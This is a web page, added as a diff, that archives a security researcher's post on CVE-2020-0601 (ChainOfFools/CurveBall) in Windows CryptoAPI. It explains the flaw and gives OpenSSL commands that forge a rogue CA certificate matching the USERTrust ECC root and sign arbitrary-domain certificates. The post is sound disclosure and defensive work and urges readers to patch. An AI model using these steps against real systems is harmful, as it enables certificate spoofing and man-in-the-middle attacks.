@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html prefix="og: http://ogp.me/ns#">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <title>CVE-2020-0601: the ChainOfFools/CurveBall attack &middot; Yolan Romailler</title>
+        <meta name="description" content="explained with a PoC">
+        <meta name="HandheldFriendly" content="True">
+        <meta name="MobileOptimized" content="320">
+        <meta name="generator" content="Hugo 0.126.1">
+        <meta name="robots" content="index,follow">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta property="og:title" content="CVE-2020-0601: the ChainOfFools/CurveBall attack">
+<meta property="og:description" content="explained with a PoC">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://romailler.ch/project/curveball-chainoffools/">
+        <link rel="stylesheet" href="https://romailler.ch/dist/site.css">
+        <link rel="stylesheet" href="https://romailler.ch/dist/syntax.css">
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,400,600,700,300&subset=latin,cyrillic-ext,latin-ext,cyrillic">
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+        
+        <link rel="stylesheet" href="https://romailler.ch//styles/font-awesome.min.css">
+<link rel="stylesheet" href="https://romailler.ch//styles/images.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.2/dist/katex.min.css" integrity="sha384-Cqd8ihRLum0CCg8rz0hYKPoLZ3uw+gES2rXQXycqnL5pgVQIflxAUDS7ZSjITLb5" crossorigin="anonymous">
+
+
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.2/dist/katex.min.js" integrity="sha384-1Or6BdeNQb0ezrmtGeqQHFpppNd7a/gw29xeiSikBbsb44xu3uAo8c7FwbF5jhbd" crossorigin="anonymous"></script>
+
+
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.2/dist/contrib/auto-render.min.js" integrity="sha384-vZTG03m+2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl" crossorigin="anonymous"
+	onload="renderMathInElement(document.body);"></script>
+	
+<script defer>
+document.addEventListener("DOMContentLoaded", function() {
+	renderMathInElement(document.body, {
+		delimiters: [
+			{left: "$$", right: "$$", display: true},
+			{left: "$", right: "$", display: false}
+		]
+	});
+});
+</script>
+
+        
+        
+        
+
+    </head>
+    <body>
+        
+  
+    
+      
+    
+  
+
+
+
+        <div id="wrapper">
+            <header class="site-header">
+                <div class="container">
+                    <div class="site-title-wrapper">
+                        
+                            <h1 class="site-title">
+                                <a href="https://romailler.ch/">Yolan Romailler</a>
+                            </h1>
+                        
+                        
+                        
+                            <a class="button-square button-social hint--top" data-hint="Twitter" aria-label="Twitter" href="https://twitter.com/anomalroil" rel="me" >
+                                <i class="fa fa-twitter" aria-hidden="true"></i>
+                            </a>
+                        
+                        
+                        
+                        
+                            <a class="button-square button-social hint--top" data-hint="Github" aria-label="Github" href="https://github.com/anomalroil" rel="me">
+                                <i class="fa fa-github-alt" aria-hidden="true"></i>
+                            </a>
+                        
+                        
+                        
+                            <a class="button-square button-social hint--top" data-hint="LinkedIn" aria-label="LinkedIn" href="https://linkedin.com/in/anomalroil/" rel="me">
+                                <i class="fa fa-linkedin" aria-hidden="true"></i>
+                            </a>
+                        
+                        
+                            <a class="button-square button-social hint--top" data-hint="Email" aria-label="Send an Email" href="mailto:yolan@romailler.ch">
+                                <i class="fa fa-envelope" aria-hidden="true"></i>
+                            </a>
+                        
+                    </div>
+
+                    <ul class="site-nav">
+                        
+    <li class="site-nav-item">
+        <a href="/post/">Blog</a>
+    </li>
+
+    <li class="site-nav-item">
+        <a href="/project/">Projects</a>
+    </li>
+
+    <li class="site-nav-item">
+        <a href="/page/talks/">Talks</a>
+    </li>
+
+    <li class="site-nav-item">
+        <a href="/page/links/">Links</a>
+    </li>
+
+    <li class="site-nav-item">
+        <a href="/page/contact/">Contact</a>
+    </li>
+
+    <li class="site-nav-item">
+        <a href="/page/about/">About</a>
+    </li>
+
+
+                    </ul>
+                </div>
+            </header>
+
+            <div id="container">
+
+
+<div class="container">
+    <article class="post-container">
+        <header class="post-header">
+    <h1 class="post-title">CVE-2020-0601: the ChainOfFools/CurveBall attack</h1>
+    
+        <p class="post-description">explained with a PoC</p>
+    
+</header>
+
+        <div class="post-content clearfix">
+    
+
+    <p>I&rsquo;ve worked on the exploitation of the CVE-2020-0601 in 2020, along with one of my colleague, Sylvain Pelisser.</p>
+<p>You can read all about it in <a href="https://research.kudelskisecurity.com/2020/01/15/cve-2020-0601-the-chainoffools-attack-explained-with-poc/">my blog post on Kudelski Security&rsquo;s research blog</a>.
+I&rsquo;ve also setup a test page in case you want to see if you are vulnerable: <a href="http://testcve.kudelskisecurity.com/">http://testcve.kudelskisecurity.com/</a></p>
+<p>We have setup a public Github repository with the Python code and the OpenSSL command lines and configuration file: <a href="https://github.com/kudelskisecurity/chainoffools">https://github.com/kudelskisecurity/chainoffools</a></p>
+<p>Below is an archive of the aforementionned blog post.</p>
+<hr>
+<p>On Tuesday the 14th of January 2020, in the frame of their first Patch Tuesday of 2020, Microsoft addressed a critical flaw discovered by the NSA in the Windows 10, Windows Server 2016 and 2019 versions of crypt32.dll, the library implementing Windows' CryptoAPI. It didn't take too long until it got branded <a href="https://blog.lessonslearned.org/chain-of-fools/">"ChainOfFools" by Kenn White in a blog post</a>. (And was then later rebranded <a href="https://twitter.com/TalBeerySec/status/1217360696893149184?s=20">"CurveBall" by Tal Be'ery</a>.)</p>
+<p><strong>TL;DR: </strong>test if you are vulnerable using our <a href="http://testcve.kudelskisecurity.com/">test website</a>!</p>
+<p>Let us explain the flaw, and demonstrate it with a POC, which we provide along with a test website and all the code to reproduce it at home.</p>
+<p>As usual in the cryptographic community, where flaws can be far-reaching, we disclose all the details that we can and released our PoC on our Github page. (This is particularly important here, since Microsoft and the NSA did not disclose any details.)</p>
+<p>Microsoft published the following information regarding the vulnerability:</p>
+<blockquote><p>A spoofing vulnerability exists in the way Windows CryptoAPI (Crypt32.dll) validates Elliptic Curve Cryptography (ECC) certificates.<br><br>An attacker could exploit the vulnerability by using a spoofed code-signing certificate to sign a malicious executable, making it appear the file was from a trusted, legitimate source. The user would have no way of knowing the file was malicious, because the digital signature would appear to be from a trusted provider. <br><br>A successful exploit could also allow the attacker to conduct man-in-the-middle attacks and decrypt confidential information on user connections to the affected software.</p></blockquote>
+<p>While this remains relatively vague, we can gather some more intel from the <a href="https://kb.cert.org/vuls/id/849224/">CERT website</a>:</p>
+<blockquote><p>As a result, an attacker may be able to craft a certificate that appears to have the ability to be traced to a trusted root certificate authority. <br><br>Any software, including third-party non-Microsoft software, that relies on the Windows <a href="https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-certgetcertificatechain">CertGetCertificateChain()</a> function to determine if an X.509 certificate can be traced to a trusted root CA may incorrectly determine the trustworthiness of a <a href="https://docs.microsoft.com/en-us/windows/win32/seccrypto/certificate-chains">certificate chain</a>. <br><br>Microsoft Windows versions that support certificates with ECC keys that specify parameters are affected.</p></blockquote>
+<p>And last but not least, we've got a "<a href="https://media.defense.gov/2020/Jan/14/2002234275/-1/-1/0/CSA-WINDOWS-10-CRYPT-LIB-20190114.PDF">Cybersecurity Advisory" from the NSA</a> themselves! And this advisory is much more detailed, and notably mentions that:</p>
+<blockquote><p>Certificates containing explicitly-defined elliptic curve parameters which only partially match a standard curve are suspicious, especially if they include the public key for a trusted certificate</p></blockquote>
+<p>And this is extremely interesting! This led us to believe that it might be possible to craft certificates using ECC and explicit parameters that do not fully match a standard curves!</p>
+<h2>Mandatory recall</h2>
+<p>In ECDSA, the private key $ k$ is a large integer, while the public key $ P_{k}$ is a point on the elliptic curve $ \mathrm{E}$ derived from $ k$ by computing $ P_k=k\cdot G$, for $ G$ a generator of the curve with large prime order $ n$ (which is generally standardized along with the curve you're using).</p>
+<h2>Root cause</h2>
+<p>So, the idea here is that there is some flaw in the way the certificates are loaded when explicit curve parameters are specified in the provided certificates. Many people discussed the topic and everyone ended agreeing on what the vulnerability had to be. <a href="https://news.ycombinator.com/item?id=22048619">Thomas Ptacek did a good summary of it on Hackernews.</a> But don't worry I'll explain it again below.</p>
+<p>Specifically, it is possible to craft a private key for an existing public key, as soon as you are not using the standard generator, but instead can choose any generator. And you can choose you own generator in X.509 certificates by using an "explicit parameters" option to set it.</p>
+<p>And because then the CryptoAPI seems to match the certificate with the one it has in cache without checking that the provided generator actually matches the standardized one, it will actually trust the certificate as if it had been correctly signed. <br>(Although not entirely, as the system still detects that the root certificate is not the same as the one in the root CA store. That is: you won't get these nice green locks you all wanted in your URL bar, but you'll still get a lock without any warning, unlike when using a self-signed certificate, even if you just crafted that certificate yourself.)</p>
+<p>It is important to notice that <strong>the problem is not in the cryptographic operations</strong> here. The maths checks out and the fact that you can craft signature that match a public key using another generator than the standardized one is not a problem in the maths. The problem here is really that the CA certificate cache used by the CryptoAPI is falsely considering that a modified root CA is in the CA certificate store as soon as its public key and serial number match a certificate that is already in the certificate cache, ignoring the fact that this modified certificate is not using the same curve parameters as the one in its cache.</p>
+<p>And it so happens that it is super easy to compute a fake generator for which we would know the private key corresponding to the public key of a given CA! Indeed if we take the existing certificate, with its public key $ P_k$, and its unknown secret key $ k$, we have then that $ k\cdot G = P_k$. Now it suffices to take some random value $ x$, and we set $ G' = x^{-1}P_k$. Then, we have that the newly crafted secret key $ x$ is a valid secret key for the public key $ P_k$ when using the new generator $ G'$, since we have that : $ x \cdot x^{-1}P_k = 1P_k = P_k$.</p>
+<p>And this effectively allows us to trick the Microsoft CryptoAPI into believing that we actually know the secret key to some CA certificate, whereas we actually only know the secret key for it when using a different generator than the standardized one!</p>
+<h2>PoC||GTFO</h2>
+<p>Now, that's just the theory, right? But how can we be sure this is actually the problem behind the CVE-2020-0601? Well... Because we've got a proof of concept working and it's just about 50 lines of Python code!</p>
+<p>First things first, you'll need to find some target certificate that's in Windows' Trusted Root CA and that's using ECC! Well, we took a look and found that the USERTrust ECC Certificate Authority has a certificate using the named curve P384! That seems like a good candidate.</p>
+<p>So, we <a href="http://www.tbs-x509.com/USERTrustECCCertificationAuthority.crt">download the certificate</a> and now we need to get its public key, which can easily be done using `openssl x509 -in USERTrustECCCertificationAuthority.crt -text -noout` directly, which gives us:</p>
+<!-- wp:code -->
+<pre><code>Certificate:
+    Data:
+        Version: 3 (0x2)
+        Serial Number:
+            5c:8b:99:c5:5a:94:c5:d2:71:56:de:cd:89:80:cc:26
+        Signature Algorithm: ecdsa-with-SHA384
+        Issuer: C = US, ST = New Jersey, L = Jersey City, O = The USERTRUST Network, CN = USERTrust ECC Certification Authority
+        Validity
+            Not Before: Feb  1 00:00:00 2010 GMT
+            Not After : Jan 18 23:59:59 2038 GMT
+        Subject: C = US, ST = New Jersey, L = Jersey City, O = The USERTRUST Network, CN = USERTrust ECC Certification Authority
+        Subject Public Key Info:
+            Public Key Algorithm: id-ecPublicKey
+                Public-Key: (384 bit)
+                pub:
+                    04:1a:ac:54:5a:a9:f9:68:23:e7:7a:d5:24:6f:53:
+                    c6:5a:d8:4b:ab:c6:d5:b6:d1:e6:73:71:ae:dd:9c:
+                    d6:0c:61:fd:db:a0:89:03:b8:05:14:ec:57:ce:ee:
+                    5d:3f:e2:21:b3:ce:f7:d4:8a:79:e0:a3:83:7e:2d:
+                    97:d0:61:c4:f1:99:dc:25:91:63:ab:7f:30:a3:b4:
+                    70:e2:c7:a1:33:9c:f3:bf:2e:5c:53:b1:5f:b3:7d:
+                    32:7f:8a:34:e3:79:79
+                ASN1 OID: secp384r1
+                NIST CURVE: P-384
+        X509v3 extensions:
+            X509v3 Subject Key Identifier: 
+                3A:E1:09:86:D4:CF:19:C2:96:76:74:49:76:DC:E0:35:C6:63:63:9A
+            X509v3 Key Usage: critical
+                Certificate Sign, CRL Sign
+            X509v3 Basic Constraints: critical
+                CA:TRUE
+    Signature Algorithm: ecdsa-with-SHA384
+         30:65:02:30:36:67:a1:16:08:dc:e4:97:00:41:1d:4e:be:e1:
+         63:01:cf:3b:aa:42:11:64:a0:9d:94:39:02:11:79:5c:7b:1d:
+         fa:64:b9:ee:16:42:b3:bf:8a:c2:09:c4:ec:e4:b1:4d:02:31:
+         00:e9:2a:61:47:8c:52:4a:4b:4e:18:70:f6:d6:44:d6:6e:f5:
+         83:ba:6d:58:bd:24:d9:56:48:ea:ef:c4:a2:46:81:88:6a:3a:
+         46:d1:a9:9b:4d:c9:61:da:d1:5d:57:6a:18
+</code></pre>
+<!-- /wp:code -->
+<p>Now, the part we want it obviously the "pub" value, but beware of ASN.1 encoding! The 04 in the front tell us it is simply the two coordinates of the point, so we can remove it and we now know that the point $ P_k$ is actually (0x1aac545aa9f96823e77ad5246f53c65ad84babc6d5b6d1e67371aedd9cd60c61fddba08903b80514ec57ceee5d3fe221, 0xb3cef7d48a79e0a3837e2d97d061c4f199dc259163ab7f30a3b470e2c7a1339cf3bf2e5c53b15fb37d327f8a34e37979).</p>
+<p>Now, we want to take a more or less random value $ x$ (we could have taken the degenerate case 1, and then the generator would have been the public key itself, but to demonstrate all the computations required, let us have a big $ x$, so we chose $ x= 2^{-1}$). Then we compute our rogue generator, which is $ G' = 2 P_k$ (since we chose our private key as the inverse of 2). Notice that the inverse is taken modulo $ n$, the order of the curve.</p>
+<p>Next, we just need to generate a pem file featuring explicit curve parameters, and using the rogue generator along with our chosen private key. This can be done by creating firstly a template pem file with <code>openssl ecparam -name secp384r1 -genkey -noout -out p384-key.pem -param_enc explicit</code> and then by editing it using Python's Crypto.IO PEM module. (See <a href="https://github.com/kudelskisecurity/chainoffools/blob/master/gen-key.py#L21">the PoC code</a> for details.)</p>
+<p>The next step is then to generate a rogue CA public file matching the serial of the real one, but using our newly crafted p384-key-rogue.pem file:</p>
+<p>`<code>openssl req -key p384-key-rogue.pem -new -out ca-rogue.pem -x509 -set_serial 0x5c8b99c55a94c5d27156decd8980cc26</code>`<br>with the parameters that you want, you can reuse the ones from the original CA certificate if you don't care: "C = US, ST = New Jersey, L = Jersey City, O = The USERTRUST Network, CN = USERTrust ECC Certification Authority".</p>
+<p>Now, we just need to produce the certificate that we want to use in the wild! We first generate a brand new cert, just like you would usually: <br><code>openssl ecparam -name prime256v1 -genkey -noout -out prime256v1-privkey.pem</code><br>Then we can produce a Certificate Signing Request as we would usually: <br><code>openssl req -key prime256v1-privkey.pem -config openssl.cnf -new -out prime256v1.csr</code> (using an openssl.cnf config file that you can find in the repo.)<br><br>And finally we can sign the CSR using our rogue CA and obtain our final public certificate:<br><code>openssl x509 -req -in prime256v1.csr -CA ca-rogue.pem -CAkey p384-key-rogue.pem -CAcreateserial -out client-cert.pem -days 500 -extensions v3_req -extfile openssl.cnf</code></p>
+<p>Et voilà!</p>
+<p><strong>We have been able to sign a certificate with arbitrary domain name and subject alternative names</strong>, and it will be recognized by Windows' CryptoAPI as being a trusted certificate! (As long as the root certificate was loaded once already, so that it is in the certificate cache.)</p>
+<figure><img src="/images/poc-chainoffools.png" alt=""/></figure>
+<p>You can try it out on our demo website, if you want to see it. (Notice this is not a Man-in-the-Middle demonstration, but rather a demo that you can have a certificate that will work under Internet Explorer, Microsoft Edge and even Chrome, and that this certificate can have arbitrary subject alternative names.)</p>
+<p><a href="https://twitter.com/CiPHPerCoder/status/1217559735089713153?s=20">Thanks to </a><a href="https://twitter.com/CiPHPerCoder">Scott Arciszewski</a> for his hint to get certificates that would bypass CT log checks in Chrome!</p>
+<h2>Public test</h2>
+<ul><li>Use a vulnerable browser on a vulnerable Windows 10 device</li><li>First open the USERTrust Certification authority demo website to have their certificate in your cache: <a href="https://usertrustecccertificationauthority-ev.comodoca.com/">https://usertrustecccertificationauthority-ev.comodoca.com/</a></li><li>Next simply open the <a href="https://chainoffools.kudelskisecurity.com">https://chainoffools.kudelskisecurity.com</a> website!</li><li>If the website loads and you can read "Hello World!", it means your browser and system are vulnerable. Otherwise, you should get a warning telling you how the website is evil. (Notice that if your network is protected by a WAF, it might be blocking the certificate already and that certain antivirus are reacting to such crafted certificates already.)</li></ul>
+<p>Or, if you don't want to click on two links, here is a test website using JS to load the original certificate from the USERTrust website and to redirect you to our PoC website: <a href="http://testcve.kudelskisecurity.com">testcve.kudelskisecurity.com</a></p>
+<h2>Conclusion</h2>
+<p>Also, notice that the vulnerability might not be as scary as we could have thought initially, as it appears that Windows Updates are signed using RSA certificates rather than ECC-based ones, and that their RSA certificate chain is pinned in the Windows Update binary . This means that Windows Updates are not at risk of being victim of a Man-in-the-Middle attack. It seems Microsoft added these countermeasure after FLAME abused a Microsoft certificate to hijack Windows Update and use it to spread.</p>
+<p>We have setup <a href="https://github.com/kudelskisecurity/chainoffools">a public Github repository with the Python code</a> and the OpenSSL command lines and configuration file: <a href="https://github.com/kudelskisecurity/chainoffools">https://github.com/kudelskisecurity/chainoffools</a></p>
+<p>In the end, please keep in mind that such a vulnerability is not at risk of being exploited by script kiddies or ransomware. While it is still a big problem because it could have allowed a Man-in-the-Middle attack against any website, you would need to face an adversary that owns the network on which you operate, which is possible for nation-state adversaries, but less so for a script kiddie. This is why we are releasing this PoC, the exploitability of this vulnerability is not good enough to lead to a sudden ransomware threat (unlike the one we had with Wannacry). This is also probably why the NSA decided not to weaponize their finding, but to rather disclose it: for them it is best to have the USA patched rather than to keep it and take the risk of it being used against the USA, as the attack surface is so vast.</p>
+<p>Also, please note that other exploits are in the wild, and <a href="https://twitter.com/saleemrash1d/status/1217495681230954506?s=20">Saleem Rashid already demonstrated a MitM attack against Github.com</a> using it after <a href="https://twitter.com/matthew_d_green/status/1217246161440051200?s=20">demonstrating a fake signature of the 7zip binary</a>. (Edit, Sallem's PoC is <a href="https://github.com/saleemrashid/badecparams">now on Github</a> as well.)</p>
+<p>Please, do patch your system as soon as possible!</p>
+<p>Other good read on the topic:</p>
+<ul><li><a href="https://blog.lessonslearned.org/chain-of-fools/">Kenn White's blog post on the topic</a></li><li><a href="https://media.defense.gov/2020/Jan/14/2002234275/-1/-1/0/CSA-WINDOWS-10-CRYPT-LIB-20190114.PDF">The NSA advisory</a></li><li><a href="https://news.ycombinator.com/item?id=22048619">The initial thoughts of Thomas Ptacek and Thomas Pornin</a></li></ul>
+<p><em>Sylvain Pelissier contributed to this blog post.&nbsp;</em></p>
+
+</div>
+
+        <footer class="post-footer clearfix"><div class="share">
+            <a class="icon-twitter" href="https://twitter.com/share?text=CVE-2020-0601%3a%20the%20ChainOfFools%2fCurveBall%20attack&url=https%3a%2f%2fromailler.ch%2fproject%2fcurveball-chainoffools%2f"
+                onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;" aria-label="Share on Twitter">
+                <i class="fa fa-twitter" aria-hidden="true"></i>
+            </a>
+            <a class="icon-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&title=CVE-2020-0601%3a%20the%20ChainOfFools%2fCurveBall%20attack&url=https%3a%2f%2fromailler.ch%2fproject%2fcurveball-chainoffools%2f&summary=explained%20with%20a%20PoC"
+               onclick="window.open(this.href, 'linkedin-share', 'width=554,height=481');return false;" aria-label="Share on LinkedIn">
+               <i class="fa fa-linkedin" aria-hidden="true"></i>
+            </a>
+    </div>
+</footer>
+    </article>
+</div>
+
+            </div>
+        </div>
+
+        <footer class="footer">
+            <div class="container">
+                <div class="site-title-wrapper">
+                    <h1 class="site-title">
+                        <a href="https://romailler.ch/">Yolan Romailler</a>
+                    </h1>
+                    <a class="button-square button-jump-top js-jump-top" href="#" aria-label="Back to Top">
+                        <i class="fa fa-angle-up" aria-hidden="true"></i>
+                    </a>
+                </div>
+
+                <p class="footer-copyright">
+                    <span>&copy; 2024</span>
+                </p>
+            </div>
+        </footer>
+
+        <script src="https://romailler.ch/js/jquery-1.11.3.min.js"></script>
+        <script src="https://romailler.ch/js/jquery.fitvids.js"></script>
+        <script src="https://romailler.ch/js/scripts.js"></script>
+    </body>
+</html>
+
